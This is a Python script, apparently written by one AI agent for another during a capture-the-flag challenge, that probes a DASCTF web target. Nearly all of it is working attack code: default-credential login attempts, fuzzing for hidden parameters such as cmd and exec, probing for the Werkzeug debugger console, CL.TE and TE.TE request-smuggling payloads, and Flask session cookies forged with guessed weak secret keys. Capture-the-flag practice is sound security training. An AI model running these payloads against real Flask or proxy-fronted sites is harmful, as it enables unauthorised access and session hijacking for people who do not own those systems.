#!/usr/bin/env python3
"""
参考脚本：测试尚未验证的攻击方向。
由 Hermes 编写，Codex 自行决定是否执行。
用法: python3 reference_explore.py
"""
import socket
import json

TARGET_HOST = "2273095efcf1270253338a5c.http-ctf2.dasctf.com"
TARGET_PORT = 80
_TARGET_IP = None

SEP = b"\r\n\r\n"
CRLF = b"\r\n"

def resolve():
    global _TARGET_IP
    if _TARGET_IP:
        return _TARGET_IP
    _TARGET_IP = socket.gethostbyname(TARGET_HOST)
    return _TARGET_IP

def raw_http(raw_request, timeout=5):
    """发送原始 HTTP 请求，返回完整响应 (bytes)"""
    ip = resolve()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((ip, TARGET_PORT))
    if isinstance(raw_request, str):
        raw_request = raw_request.encode()
    s.sendall(raw_request)
    resp = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
    except socket.timeout:
        pass
    s.close()
    return resp

def get_body(resp):
    if SEP in resp:
        return resp.split(SEP, 1)[-1]
    return b""

def get_status(resp):
    return resp.split(CRLF, 1)[0].decode(errors="replace")

def check_flag(resp):
    for marker in [b"flag{", b"FLAG{", b"ctf{", b"CTF{"]:
        if marker in resp:
            return True
    return False

def show_result(label, resp):
    status = get_status(resp)
    body = get_body(resp)
    print(f"  {label}: {status} body={len(body)}")
    if check_flag(resp):
        print("  *** FLAG FOUND! ***")
        print(resp.decode(errors="replace"))

# ---------------------------------------------------------------
def test_post_root():
    """方向1: POST 到 / (根路径) — 从未测试过"""
    print("=" * 60)
    print("[1] POST / with form data")
    # 表单 POST - admin/admin
    body = "username=admin&password=admin"
    req = (
        "POST / HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
        f"{body}"
    )
    resp = raw_http(req)
    show_result("POST / admin/admin (form)", resp)

    # JSON POST
    print("[1b] POST / with JSON")
    jbody = json.dumps({"username": "admin", "password": "admin"})
    req = (
        "POST / HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {len(jbody)}\r\n"
        "Connection: close\r\n"
        "\r\n"
        f"{jbody}"
    )
    resp = raw_http(req)
    show_result("POST / admin/admin (json)", resp)

    # 其他常见凭据
    for user, pwd in [("admin", "password"), ("admin", "123456"),
                      ("guest", "guest"), ("admin", "admin123")]:
        body = f"username={user}&password={pwd}"
        req = (
            "POST / HTTP/1.1\r\n"
            f"Host: {TARGET_HOST}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
            f"{body}"
        )
        resp = raw_http(req)
        show_result(f"POST / {user}/{pwd}", resp)

def test_hidden_params():
    """方向3: 隐藏查询参数在 / 上"""
    print("=" * 60)
    print("[3] Hidden query parameters on /")
    params = ["source", "debug", "flag", "cmd", "file", "read", "path",
              "action", "id", "page", "code", "show", "view", "template",
              "exec", "run", "shell", "test", "secret", "token"]
    baseline_req = (
        "GET / HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Connection: close\r\n\r\n"
    )
    baseline_resp = raw_http(baseline_req)
    baseline_len = len(baseline_resp)
    print(f"  Baseline: {baseline_len} bytes")
    for p in params:
        req = (
            f"GET /?{p}=1 HTTP/1.1\r\n"
            f"Host: {TARGET_HOST}\r\n"
            "Connection: close\r\n\r\n"
        )
        resp = raw_http(req)
        rlen = len(resp)
        if rlen != baseline_len:
            status = get_status(resp)
            print(f"  ?{p}=1: {rlen} bytes ({status}) *** DIFFERENT!")
            if check_flag(resp):
                print(resp.decode(errors="replace"))
        else:
            print(f"  ?{p}=1: {rlen} bytes (same)")

def test_debugger():
    """方向4: Werkzeug debugger 端点"""
    print("=" * 60)
    print("[4] Werkzeug debugger endpoints")
    for path in ["/__debugger__", "/console", "/__debugger__/console",
                 "/debug", "/__debugger__/pin"]:
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {TARGET_HOST}\r\n"
            "Connection: close\r\n\r\n"
        )
        resp = raw_http(req)
        show_result(path, resp)

def test_cl_te_smuggling():
    """方向5: CL.TE HTTP Request Smuggling"""
    print("=" * 60)
    print("[5] CL.TE smuggling")
    # CL.TE: openresty 按 CL 处理, Flask 按 TE 处理
    smuggled = (
        f"GET /flag HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Connection: close\r\n\r\n"
    )
    chunked_body = "0\r\n\r\n" + smuggled
    req = (
        "POST / HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        f"Content-Length: {len(smuggled)}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        f"{chunked_body}"
    )
    try:
        resp = raw_http(req, timeout=5)
        print(f"  CL.TE response ({len(resp)} bytes):")
        # 检查是否有第二个 HTTP 响应
        body_part = get_body(resp)
        if b"HTTP/1.1" in body_part:
            print("  *** SECOND RESPONSE DETECTED! ***")
        print(f"  {resp[:500].decode(errors='replace')}")
        if check_flag(resp):
            print("  *** FLAG FOUND! ***")
    except Exception as e:
        print(f"  Error: {e}")

    # TE.TE: 混淆 Transfer-Encoding
    smuggled2 = (
        f"GET /admin HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Connection: close\r\n\r\n"
    )
    chunked_body2 = "0\r\n\r\n" + smuggled2
    req2 = (
        "POST / HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        f"Content-Length: {len(smuggled2)}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding: cow\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        f"{chunked_body2}"
    )
    try:
        resp2 = raw_http(req2, timeout=5)
        print(f"  TE.TE response ({len(resp2)} bytes):")
        print(f"  {resp2[:500].decode(errors='replace')}")
        if check_flag(resp2):
            print("  *** FLAG FOUND! ***")
    except Exception as e:
        print(f"  Error: {e}")

def test_trigger_500():
    """方向: 触发 500 错误获取 traceback"""
    print("=" * 60)
    print("[6] Trigger 500 errors")
    # 畸形 JSON
    bad_json = '{"username": "admin", "password": "admin"'
    req = (
        "POST / HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {len(bad_json)}\r\n"
        "Connection: close\r\n"
        "\r\n"
        f"{bad_json}"
    )
    resp = raw_http(req)
    show_result("Malformed JSON POST /", resp)
    if b"500" in resp.split(CRLF, 1)[0]:
        print("  *** 500 ERROR - checking for traceback ***")
        print(resp.decode(errors="replace")[:1500])

    # 超长参数
    long_val = "A" * 10000
    body = f"username={long_val}&password=admin"
    req = (
        "POST / HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
        f"{body}"
    )
    resp = raw_http(req)
    show_result("Long param POST /", resp)

def test_flask_session_forgery():
    """方向2: Flask session cookie 伪造"""
    print("=" * 60)
    print("[2] Flask session cookie forgery")
    try:
        from itsdangerous import URLSafeTimedSerializer
    except ImportError:
        print("  itsdangerous not installed, skipping")
        return

    weak_keys = ["secret", "password", "key", "flask", "admin", "123456",
                 "secret_key", "super_secret_key", "easy_web", "dasctf",
                 "CHANGE_ME", "default", "dev", "development"]
    session_data = {"admin": True, "logged_in": True, "username": "admin"}

    for key in weak_keys:
        try:
            s = URLSafeTimedSerializer(key, salt="cookie-session")
            cookie_val = s.dumps(session_data)
        except Exception:
            continue
        # 发给 /admin 和 /flag 和 /
        for path in ["/", "/admin", "/flag", "/dashboard"]:
            req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {TARGET_HOST}\r\n"
                f"Cookie: session={cookie_val}\r\n"
                "Connection: close\r\n\r\n"
            )
            resp = raw_http(req)
            status = get_status(resp)
            body = get_body(resp)
            # 与无 cookie 的基线比较
            baseline_req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {TARGET_HOST}\r\n"
                "Connection: close\r\n\r\n"
            )
            baseline_resp = raw_http(baseline_req)
            if len(resp) != len(baseline_resp):
                print(f"  key={key} path={path}: {status} body={len(body)} *** DIFFERENT!")
                if check_flag(resp):
                    print("  *** FLAG FOUND! ***")
                    print(resp.decode(errors="replace"))
        print(f"  key={key}: tested (no diff unless noted)")

if __name__ == "__main__":
    test_post_root()
    test_hidden_params()
    test_debugger()
    test_cl_te_smuggling()
    test_trigger_500()
    test_flask_session_forgery()
